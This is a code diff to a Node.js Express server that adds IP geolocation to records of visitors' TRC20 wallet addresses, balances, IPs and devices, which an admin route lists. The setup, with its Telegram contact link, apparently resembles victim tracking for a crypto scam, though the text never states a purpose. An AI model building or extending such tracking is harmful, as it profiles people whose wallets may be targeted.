@@ -3,6 +3,7 @@ const cors = require('cors');
 const fs = require('fs');
 const path = require('path');
 const UAParser = require('ua-parser-js');
+const geoip = require('geoip-lite');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -55,7 +56,7 @@ const authenticateToken = (req, res, next) => {
     next();
 };
 
-// ========== 工具函数 ==========
+// ==================== 工具函数 ====================
 function formatBeijingTime(iso) {
     try {
         const d = new Date(iso);
@@ -64,6 +65,7 @@ function formatBeijingTime(iso) {
         return bj.toISOString().replace('T', ' ').slice(0, 19);
     } catch { return ''; }
 }
+
 function guessDevice(ua) {
     const s = (ua || '').toLowerCase();
     if (/iphone|ipad|ipod/.test(s)) return 'ios';
@@ -71,7 +73,9 @@ function guessDevice(ua) {
     if (/windows|mac os|macintosh|linux|x11|cros/.test(s)) return 'desktop';
     return 'unknown';
 }
-function guessCountry(lang) {
+
+// 语言推断（仅作为 IP 定位失败时的兜底）
+function guessCountryByLang(lang) {
     const map = {
         zh:'CN', en:'US', es:'ES', hi:'IN', ar:'SA', pt:'BR', ru:'RU', ja:'JP',
         de:'DE', fr:'FR', ko:'KR', it:'IT', tr:'TR', vi:'VN', th:'TH', id:'ID',
@@ -81,6 +85,25 @@ function guessCountry(lang) {
     return map[l] || '';
 }
 
+// IP 优先，语言兜底
+function detectCountry(ip, language) {
+    // 1) 先尝试 IP 定位
+    if (ip) {
+        let cleanIp = String(ip).split(',')[0].trim();
+        cleanIp = cleanIp.replace(/^::ffff:/, ''); // 去掉 IPv6 映射前缀
+        if (cleanIp && cleanIp !== '::1' && !cleanIp.startsWith('127.') && !cleanIp.startsWith('10.') && !cleanIp.startsWith('192.168.')) {
+            try {
+                const geo = geoip.lookup(cleanIp);
+                if (geo && geo.country) return geo.country;
+            } catch (e) {
+                console.warn('geoip lookup 失败:', e.message);
+            }
+        }
+    }
+    // 2) IP 定位失败（内网、数据库未命中），回退到语言推断
+    return guessCountryByLang(language);
+}
+
 // ==================== 公共 API ====================
 
 // 前端读取飞机号配置
@@ -88,7 +111,7 @@ app.get('/api/public-settings', (req, res) => {
     res.json({ telegramLink: config.telegramLink || '' });
 });
 
-// 前端提交 TRC20 记录（原有逻辑：接收前端数据 + 服务器补充 UA/IP/时间等字段）
+// 前端提交 TRC20 记录
 app.post('/api/records', (req, res) => {
     try {
         const ip = req.ip || req.connection.remoteAddress || '';
@@ -100,13 +123,13 @@ app.post('/api/records', (req, res) => {
         const nowIso = new Date().toISOString();
         const body = req.body || {};
         const language = body.language || '';
-        const country = guessCountry(language);
+        const country = detectCountry(ip, language);
 
         const newRecord = {
             id: Date.now() + '_' + Math.random().toString(36).slice(2, 8),
             address: body.address || '',
             balance: body.balance || '0.00',
-            amount: body.balance || '0.00',      // 兼容 admin 里的 r.amount 展示
+            amount: body.balance || '0.00',
             language: language,
             ip: ip,
             userAgent: ua,
@@ -132,7 +155,7 @@ app.post('/api/records', (req, res) => {
     }
 });
 
-// 后台获取所有记录（原有格式：{ records: [...] }）
+// 后台获取所有记录
 app.get('/api/records', authenticateToken, (req, res) => {
     res.json({ records: records.slice().reverse() });
 });
